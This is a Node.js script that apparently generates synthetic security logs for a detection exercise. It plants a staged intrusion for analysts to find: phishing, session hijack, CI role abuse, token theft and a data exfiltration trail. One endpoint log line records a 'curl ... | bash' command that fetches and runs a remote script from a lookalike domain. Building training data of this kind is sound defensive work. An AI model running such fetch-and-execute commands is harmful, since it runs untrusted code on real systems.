import fs from "node:fs";
import path from "node:path";

const root = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const out = path.join(root, "telemetry");
fs.mkdirSync(out, { recursive: true });

let state = 0xA8B55A11;
const rnd = () => ((state = (state * 1664525 + 1013904223) >>> 0) / 2 ** 32);
const pick = (a) => a[Math.floor(rnd() * a.length)];
const iso = (ms) => new Date(ms).toISOString();
const start = Date.parse("2026-03-09T00:00:00Z");
const end = Date.parse("2026-03-16T00:00:00Z");
const users = ["e.park", "a.velasquez", "r.kapoor", "t.owens", "m.sato", "l.chen", "n.byrd"];
const hosts = ["FIN-WS22", "FIN-WS31", "MAC-DEV-17", "MAC-DEV-04", "BLD-RUN-02"];

function write(name, lines) {
  fs.writeFileSync(path.join(out, name), lines.join("\n") + "\n");
}

const okta = [];
for (let t = start; t < end; t += 150000 + Math.floor(rnd() * 420000)) {
  const user = pick(users);
  const success = rnd() > 0.035;
  okta.push(JSON.stringify({
    published: iso(t),
    eventType: success ? pick(["user.authentication.sso", "user.session.start", "application.user_membership.list"]) : "user.authentication.auth_via_mfa",
    actor: { alternateId: `${user}@halcyonmeridian.com` },
    client: { ipAddress: `10.${20 + Math.floor(rnd() * 5)}.${1 + Math.floor(rnd() * 200)}.${10 + Math.floor(rnd() * 200)}`, userAgent: { rawUserAgent: pick(["Mozilla/5.0 Chrome/134", "Mozilla/5.0 Safari/18.3", "Okta Verify/9.31"]) } },
    outcome: { result: success ? "SUCCESS" : "FAILURE", reason: success ? undefined : "INVALID_CREDENTIALS" },
    transaction: { id: `txn-${Math.floor(rnd() * 1e9).toString(16).padStart(8, "0")}` }
  }));
}
okta.push(
  JSON.stringify({published:"2026-03-14T08:14:22.000Z",eventType:"user.authentication.sso",actor:{alternateId:"e.park@halcyonmeridian.com"},client:{ipAddress:"198.51.100.24",userAgent:{rawUserAgent:"Mozilla/5.0 Chrome/134"}},outcome:{result:"SUCCESS"},transaction:{id:"txn-84e2a11f"}}),
  JSON.stringify({published:"2026-03-14T08:16:11.000Z",eventType:"app.oauth2.as.authorize",actor:{alternateId:"e.park@halcyonmeridian.com"},client:{ipAddress:"45.83.64.19",userAgent:{rawUserAgent:"Mozilla/5.0 Chrome/134"}},outcome:{result:"SUCCESS"},debugContext:{debugData:{origin:"NEW_CITY",requestUri:"/oauth2/v1/authorize?client_id=box-sync-docs"}},transaction:{id:"txn-84e2a120"}}),
  JSON.stringify({published:"2026-03-14T08:18:41.000Z",eventType:"user.session.start",actor:{alternateId:"e.park@halcyonmeridian.com"},client:{ipAddress:"45.83.64.19",userAgent:{rawUserAgent:"Mozilla/5.0 Chrome/134"}},outcome:{result:"SUCCESS"},debugContext:{debugData:{behaviors:"New Geo, New ASN, Session Cookie Reuse"}},transaction:{id:"txn-84e2a121"}})
);
okta.sort();
write("okta_system_week.jsonl", okta);

const proxy = [];
for (let t = start; t < end; t += 30000 + Math.floor(rnd() * 150000)) {
  const host = pick(hosts);
  const user = pick(users);
  const target = pick(["cdn.slack.com", "login.microsoftonline.com", "api.github.com", "registry.npmjs.org", "docs.aws.amazon.com", "halcyonmeridian.box.com"]);
  proxy.push(`${iso(t)} req=${Math.floor(rnd()*1e12).toString(16)} src=${host} user=${user}@halcyonmeridian.com method=${pick(["GET","GET","CONNECT"])} host=${target} status=${pick([200,200,200,304])} bytes=${500+Math.floor(rnd()*240000)} ua="${pick(["Mozilla/5.0 Chrome/134","curl/8.7.1","npm/10.9.0 node/v22.8.0"])}"`);
}
proxy.push(
  "2026-03-14T08:13:58.000Z req=ph-84e2 src=FIN-WS22 user=e.park@halcyonmeridian.com method=GET host=review-board-portal.com status=200 bytes=11234 ua=\"Mozilla/5.0 Chrome/134\"",
  "2026-03-14T10:06:11.000Z req=np-4a21 src=MAC-DEV-17 user=r.kapoor@halcyonmeridian.com method=GET host=cdn-build-linker.com status=200 bytes=442 ua=\"bash/5.2\"",
  "2026-03-14T11:14:44.000Z req=bx-7f20 src=ip-10-42-18-23 user=svc-exporter method=POST host=upload.box.com status=201 bytes=94513012 ua=\"python-requests/2.31\"",
  "2026-03-14T11:16:02.000Z req=bx-7f31 src=45.83.64.19 user=anonymous method=GET host=files.box.com status=200 bytes=94513092 ua=\"curl/8.6.0\""
);
proxy.sort();
write("secure_web_gateway_week.log", proxy);

const cloud = [];
for (let t = start; t < end; t += 80000 + Math.floor(rnd() * 260000)) {
  const eventName = pick(["DescribeInstances", "ListBuckets", "GetCallerIdentity", "DescribeCluster", "ListObjectsV2", "GetParameter"]);
  cloud.push(JSON.stringify({eventVersion:"1.09",eventTime:iso(t),eventSource:pick(["ec2.amazonaws.com","s3.amazonaws.com","sts.amazonaws.com","eks.amazonaws.com","ssm.amazonaws.com"]),eventName,awsRegion:"us-west-2",sourceIPAddress:"10.3.8.12",userAgent:"aws-sdk-go/1.55.5",userIdentity:{type:"AssumedRole",arn:"arn:aws:sts::552200771193:assumed-role/secops-readonly/inventory"},requestID:`${Math.floor(rnd()*1e9).toString(16)}-${Math.floor(rnd()*1e9).toString(16)}`,readOnly:true}));
}
cloud.push(
  JSON.stringify({eventVersion:"1.09",eventTime:"2026-03-14T10:11:47.000Z",eventSource:"sts.amazonaws.com",eventName:"AssumeRoleWithWebIdentity",awsRegion:"us-west-2",sourceIPAddress:"140.82.112.1",userAgent:"aws-sdk-go/1.55.5",userIdentity:{type:"WebIdentityUser",principalId:"repo:halcyonmeridian/release-orchestrator:ref:refs/heads/hotfix/cache-key"},responseElements:{subjectFromWebIdentityToken:"repo:halcyonmeridian/release-orchestrator:ref:refs/heads/hotfix/cache-key",assumedRoleUser:{arn:"arn:aws:sts::552200771193:assumed-role/release-orchestrator/run-88421"}},requestID:"a93c41d1-88421"}),
  JSON.stringify({eventVersion:"1.09",eventTime:"2026-03-14T10:13:17.000Z",eventSource:"ssm.amazonaws.com",eventName:"GetParameter",awsRegion:"us-west-2",sourceIPAddress:"10.42.18.23",userAgent:"aws-sdk-python/1.34",userIdentity:{type:"AssumedRole",arn:"arn:aws:sts::552200771193:assumed-role/release-orchestrator/run-88421"},requestParameters:{name:"/prod/export/box_token",withDecryption:true},requestID:"c44e2f11-88421",readOnly:true})
);
cloud.sort();
write("cloudtrail_week.jsonl", cloud);

const dns = ["ts,client,query,type,response,rcode,latency_ms"];
for (let t = start; t < end; t += 45000 + Math.floor(rnd() * 200000)) {
  const q = pick(["cdn.slack.com", "login.microsoftonline.com", "api.github.com", "registry.npmjs.org", "s3.us-west-2.amazonaws.com", "halcyonmeridian.box.com"]);
  dns.push(`${iso(t)},${pick(hosts)},${q},A,${pick(["13.107.42.14","140.82.112.5","52.92.128.17","74.112.186.55"])},NOERROR,${2+Math.floor(rnd()*45)}`);
}
dns.push("2026-03-14T08:13:57.892Z,FIN-WS22,review-board-portal.com,A,198.51.100.24,NOERROR,18");
dns.push("2026-03-14T10:06:10.882Z,MAC-DEV-17,cdn-build-linker.com,A,203.0.113.71,NOERROR,31");
dns.push("2026-03-14T12:39:58.183Z,RSCH-JUP-03,pool-research.example,A,192.0.2.77,NOERROR,44");
dns.sort((a,b)=>a.startsWith("ts,")?-1:b.startsWith("ts,")?1:a.localeCompare(b));
write("dns_week.csv", dns);

const endpoint = ["UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes"];
for (let t = start; t < end; t += 180000 + Math.floor(rnd() * 720000)) {
  const host = pick(hosts); const user = pick(users); const image = pick(["chrome.exe","outlook.exe","slack.exe","git","node","powershell.exe"]);
  endpoint.push(`${iso(t).replace("T"," ").replace("Z","")},${host},${user},1,${image},"${image}",explorer.exe,,,SHA256=${Math.floor(rnd()*1e16).toString(16).padStart(16,"0").repeat(4)}`);
}
endpoint.push("2026-03-14 08:13:58.000,FIN-WS22,e.park,1,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,\"chrome.exe https://review-board-portal.com/session/84e2\",C:\\Windows\\explorer.exe,,,SHA256=77009e7fea4910b7cc067dba3daf02d8722756a959f373cf04d0e8f372894cfb");
endpoint.push("2026-03-14 10:06:11.000,MAC-DEV-17,r.kapoor,1,/bin/bash,\"bash -c curl -fsSL https://cdn-build-linker.com/install.sh | bash\",/usr/local/bin/node,,,SHA256=8c117ac5f74747e9013c8f55b4c56bcf1aaf0cb8f151bdf224426817e2f82424");
endpoint.sort((a,b)=>a.startsWith("UtcTime")?-1:b.startsWith("UtcTime")?1:a.localeCompare(b));
write("endpoint_process_week.csv", endpoint);

const manifest = {
  generated_at: new Date().toISOString(),
  deterministic_seed: "0xA8B55A11",
  coverage: { start: iso(start), end: iso(end) },
  files: ["okta_system_week.jsonl","secure_web_gateway_week.log","cloudtrail_week.jsonl","dns_week.csv","endpoint_process_week.csv"],
  note: "Fictional but parseable training telemetry. Documentation-only IP ranges are intentional."
};
fs.writeFileSync(path.join(out, "manifest.json"), JSON.stringify(manifest, null, 2) + "\n");
